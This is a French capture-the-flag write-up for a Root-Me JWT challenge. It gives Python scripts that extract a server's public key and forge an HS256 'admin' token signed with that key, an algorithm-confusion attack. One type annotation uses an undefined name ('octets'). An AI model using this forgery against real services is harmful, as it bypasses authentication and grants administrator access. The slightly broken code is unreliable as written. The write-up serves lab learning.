



Script : 


```python
└─$ cat parse_json.py


def main():

    liste_carac = ['[',']','"','\n'," "]
    with open("public_key_chall60_root-me.json","r",encoding="utf8") as fd:
        lignes = fd.readlines()
        for ligne in lignes :
            nouvelle_ligne = ligne
            for carac in liste_carac :
                 nouvelle_ligne = nouvelle_ligne.replace(carac,'')
                 ligne_finale = nouvelle_ligne.replace(",","\n")
                 #with open("result_jwt","a",)
#             nouvelle_ligne = ligne.strip('[]"\n')
            #print(ligne)
            #for carac in liste_carac :

             #   nouvelle_ligne = ligne.strip(carac)
              #  print(carac)
#    print(ligne_finale)

    with open("result_jwt","w",encoding="utf8") as fichier:
        fichier.write(ligne_finale)



if __name__ == "__main__":
    main()
```


![](../img/Pasted%20image%2020261024004345.png)

Script de confusion d'algorithme : 


![](Write%20Up/img/Pasted%20image%2020261024004135.png)

```python
#import jwt
import hmac,hashlib,base64,json

def b64url(donne:octets) -> str: #Renvoie un str
    return base64.urlsafe_b64encode(donne).rstrip(b"=").decode() #https://docs.python.org/3/library/base64.html#base64.urlsafe_b64encode

def main():
#    token = "" #Il faut rentrer le token qui à était générer par le serveur, ici dans notre cas c'est lorsqu'on utilise l'endpoint "/auth" et que celui-ci accepte notre demande de création d'un token jwt.

    with open("result_jwt","r",encoding="utf8") as fd:
        public_key = fd.read().encode() #Ici on transforme les str en codage.
#        print(public_key)

        header={"alg":"HS256","typ":"JWT"}
        payload={"username":"admin"}

        champs = b64url(json.dumps(header,separators=(",",":")).encode()) + "." + \
        b64url(json.dumps(payload,separators=(",",":")).encode())

        signature=hmac.new(public_key,champs.encode(),hashlib.sha256).digest()
        token = champs + "." + b64url(signature)

        print(token)
#        jwt_encoder = jwt.encode({"username":"admin"},public_key, algorithm="HS256") On ne peut pas utiliser cette option, puisque jwt vérifie directement le secret pour voir s'il n'y a pas une confusion. Il va falloir la créer nous même avec hmac,hashlib,base64,json


#    print(jwt_encoder)
if __name__ == "__main__":
    main()
```

